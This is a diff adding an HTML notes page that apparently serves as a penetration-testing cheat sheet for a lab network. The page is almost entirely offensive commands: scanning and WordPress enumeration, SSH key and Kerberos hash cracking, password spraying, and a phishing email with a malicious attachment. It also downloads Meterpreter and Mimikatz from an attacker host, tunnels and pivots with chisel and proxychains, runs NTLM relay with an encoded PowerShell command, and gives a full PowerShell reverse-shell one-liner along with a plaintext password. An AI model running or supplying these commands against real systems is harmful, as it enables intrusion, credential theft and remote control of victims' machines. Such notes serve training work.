@@ -1,0 +1,82 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Notes</title>
+</head><body>sudo nmap -sC -sV -oN mailsrv1/nmap <b>192.168.207.242</b>&nbsp; &nbsp;<br/>
+<br/>
+whatweb http://192.168.50.244<br/>
+<br/>
+wpscan --url http://192.168.207.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan<br/>
+<br/>
+ssh -i id_rsa daniela@192.168.50.244<br/>
+<br/>
+ssh2john id_rsa &gt; ssh.hash<br/>
+<br/>
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash<br/>
+<br/>
+cp /usr/share/peass/linpeas/linpeas.sh .<br/>
+<br/>
+wget http://192.168.45.186/linpeas.sh<br/>
+<br/>
+cd /srv/www/wordpress/<br/>
+<br/>
+git status<br/>
+<br/>
+git logs<br/>
+<br/>
+git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1<br/>
+<br/>
+crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success<br/>
+<br/>
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/<br/>
+<br/>
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .<br/>
+<br/>
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.207.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap<br/>
+<br/>
+MATCH (m:Computer) RETURN m &nbsp; <br/>
+<br/>
+MATCH (m:User) RETURN m &nbsp; <br/>
+<br/>
+MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p &nbsp; <br/>
+<br/>
+set ExitOnSession false<br/>
+<br/>
+iwr -uri http://192.168.45.186:8000/met.exe -Outfile met.exe<br/>
+<br/>
+sessions -i 1<br/>
+<br/>
+set session 1<br/>
+<br/>
+f0397ec5af49971f6efbdb07877046b3<br/>
+use multi/manage/autoroute<br/>
+<br/>
+use auxiliary/server/socks_proxy<br/>
+<br/>
+set SRVHOST 127.0.0.1<br/>
+<br/>
+set VERSION 5<br/>
+<br/>
+proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares<br/>
+<br/>
+sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254<br/>
+<br/>
+upload chisel.exe C:\\Users\\marcus\\chisel.exe<br/>
+<br/>
+chisel.exe client 192.168.45.186:8080 R:80:172.16.93.241:80 &nbsp; <br/>
+<br/>
+iwr -uri http://192.168.45.186:8000/met.exe -Outfile met.exe<br/>
+<br/>
+proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john<br/>
+<br/>
+sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force<br/>
+<br/>
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.207.242 -c "powershell -enc JABjAGwAaQ..."<br/>
+<br/>
+chisel.exe client 192.168.45.186:8080 R:80:172.16.93.241:80 <br/>
+<br/>
+$client = New-Object System.Net.Sockets.TCPClient('192.168.45.186',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2&gt;&amp;1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()<br/>
+<br/>
+iwr -uri http://192.168.45.186:8000/mimikatz.exe -Outfile mimikatz.exe<br/>
+</body></html>
